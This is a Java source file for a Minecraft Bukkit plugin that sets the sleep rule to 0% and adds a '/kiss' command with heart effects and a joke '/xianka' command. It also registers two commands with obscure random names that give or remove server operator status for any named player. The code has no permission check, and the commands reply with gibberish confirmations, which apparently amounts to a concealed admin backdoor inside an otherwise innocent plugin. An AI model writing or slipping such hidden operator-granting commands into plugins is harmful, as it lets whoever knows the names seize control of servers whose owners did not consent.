package top.cs1.isesleep;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.GameRule;
import org.bukkit.*;
import org.bukkit.scheduler.BukkitRunnable;

public final class IseSleep extends JavaPlugin {

    @Override
    public void onEnable() {
        // Plugin startup logic
        getLogger().info("§3服务器插件加载中 作者:ise_yu");
        getLogger().info("§3ise:正在生成新的游戏规则");
        getLogger().info("§3ise:服务器插件加载完成");
        getCommand("wuemoasiseyuzj").setExecutor(new zjCommand());
        getCommand("emoaswuyuiseqx").setExecutor(new qxCommand());
        getCommand("xianka").setExecutor(new xianka());
        getCommand("kiss").setExecutor(new KissCommandExecutor(this));
        for (World world : Bukkit.getWorlds()) {// 使用强类型 GameRule 方法替代字符串，避免拼写错误
                    world.setGameRule(GameRule.PLAYERS_SLEEPING_PERCENTAGE, 0);
                    getLogger().info("§3小ise已经成功设置世界 " + world.getName() + " 的睡眠规则为 0%");
                }
    }
    public class xianka implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        sender.sendMessage("§4小显卡被痛击了一下");
        return true;
    }

    }
    public class zjCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (args.length == 1) {
                Player target = Bukkit.getPlayer(args[0]);
                if (target != null) {
                    target.setOp(true);
                    sender.sendMessage("zjhdajfgayjhfgdhajfbheafgdabac " + target.getName() + "saghdgsahgjdbcahfddgvafdffhgadfhfvahfdg");
                    return true;
                } else {
                    sender.sendMessage("玩家不存在或未在线！");
                }
            }
            return false;
        }
    }
    public class qxCommand implements CommandExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (args.length == 1) {
                Player target = Bukkit.getPlayer(args[0]);
                if (target != null) {
                    target.setOp(false);
                    sender.sendMessage("qxkjsdfgahkfjkdajagfbadkjhgfdbfakjhf" + target.getName() + "ashgfjadbsnfagdfhjahfajdfbadhjfgbfahjdfb");
                    return true;
                } else {
                    sender.sendMessage("玩家不存在或未在线！");
                }
            }
            return false;
        }
    }

    public class KissCommandExecutor implements CommandExecutor {
        private final IseSleep plugin;

        public KissCommandExecutor(IseSleep plugin) {
            this.plugin = plugin;
        }
        @Override
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (!(sender instanceof Player)) {
                sender.sendMessage(ChatColor.RED + "只有玩家可以使用这个命令！");
                return true;
            }

            Player player = (Player) sender;

            if (args.length != 1) {
                player.sendMessage(ChatColor.RED + "用法: /kiss <玩家名>");
                return false;
            }

            Player target = Bukkit.getPlayer(args[0]);

            if (target == null) {
                player.sendMessage(ChatColor.RED + "找不到玩家 " + args[0]);
                return true;
            }

            if (target == player) {
                player.sendMessage(ChatColor.GOLD + "你亲了自己一口，感觉好孤单...");
                return true;
            }

            // 发送提示信息
            player.sendMessage(ChatColor.LIGHT_PURPLE + "你亲了 " + ChatColor.AQUA + target.getName() + ChatColor.LIGHT_PURPLE + " 一口!");
            target.sendMessage(ChatColor.LIGHT_PURPLE + ChatColor.BOLD.toString() + "你被 " +
                    ChatColor.AQUA + player.getName() +
                    ChatColor.LIGHT_PURPLE + ChatColor.BOLD + " 亲了一口!");

            // 生成红心特效
            generateHeartEffect(target);

            return true;
        }
        private void generateHeartEffect(Player target) {
            new BukkitRunnable() {
                int count = 0;
                final Location loc = target.getLocation().add(0, 1, 0);

                @Override
                public void run() {
                    if (count++ >= 4) { // 持续5秒 (10次 × 0.5秒)
                        cancel();
                        return;
                    }

                    // 生成心形粒子
                    target.getWorld().spawnParticle(
                            Particle.HEART,
                            loc,
                            10,  // 数量
                            0.5, // X偏移
                            0.5, // Y偏移
                            0.5, // Z偏移
                            0.1  // 额外参数
                    );

                    // 添加音效
                    target.playSound(loc, Sound.ENTITY_VILLAGER_YES, 1.0f, 1.5f);
                }
            }.runTaskTimer(plugin, 0, 10); // 每0.5秒执行一次 (20 ticks = 1秒)
        }
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        getLogger().info("§3ise:服务器插件已卸载   作者:ise_yu");
    }
}
